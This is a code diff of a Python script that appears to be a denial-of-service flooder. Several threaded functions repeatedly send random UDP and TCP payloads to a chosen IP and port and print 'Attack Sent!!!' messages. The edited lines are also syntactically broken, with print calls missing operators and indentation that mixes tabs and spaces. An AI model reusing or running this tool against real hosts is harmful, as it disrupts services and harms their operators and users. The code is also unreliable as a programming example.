@@ -87,20 +87,20 @@ time.sleep(5),
 
 def run():
 	data = random._urandom(1024)
-	time.sleep()
+	i = random.choice(("[+]","[-]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			addr = (str(ip),int(port))
-			x = threading.Thread(target=thread_function, args=(index,) ,  daemon=True)
-                        x.start()
+			for x in range(times):
 				s.sendto(data,addr)
-			print(i + "\033[35mtcp  \033[32mנשלח באופן אקראי\033[0m")
+			print(i "[+]  \033[32mAttack Sent!!!\033[0m")
 		except:
-			print("\033[31m[!] \033[92m May be down..!\033[0m")
+			print("[-] Error!!!")
 
 def run2():
 	data = random._urandom(999)
+	i = random.choice(("[+]","[-]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -108,14 +108,15 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i + "\033[32mSitus \033[4mdiserang...! \033[0m")
+			print(i "[+]  \033[32mAttack Sent!!!\033[0m")
 		except:
 			s.close()
-			print("\033[31m[!] \033[92m May be down..!\033[0m")
+			print("[*] Error!!!")
             
 
 def run3():
 	data = random._urandom(818)
+	i = random.choice(("[+]","[-]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -123,14 +124,15 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"\033[33mPermintaan \033[94mterkirim \033[0m")
+			print(i "[+]  \033[32mAttack Sent!!!\033[0m")
 		except:
 			s.close()
-			print("\033[31m[!] \033[92m May be down..!\033[0m")
+			print("[*] Error!!!")
             
   
 def run4():
 	data = random._urandom(16)
+	i = random.choice(("[+]","[-]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -138,10 +140,10 @@ def run4():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i + "\033[95mZona \033[96m" +ip+ "\033[32mtidak aman!! \033[0m")
+			print(i "[+]  \033[32mAttack Sent!!!\033[0m")
 		except:
 			s.close()
-			print("\033[31m[!] \033[92m May be down..!\033[0m")
+			print("[*] Error!!!")
 											
             
 for y in range(threads):
@@ -149,9 +151,4 @@ for y in range(threads):
 		th = threading.Thread(target = run)
 		th.start()
 		th = threading.Thread(target = run2)
-		th.start()
-		th = threading.Thread(target = run3)
-		th.start()
-else:
-		th = threading.Thread(target = run4)
 		th.start()
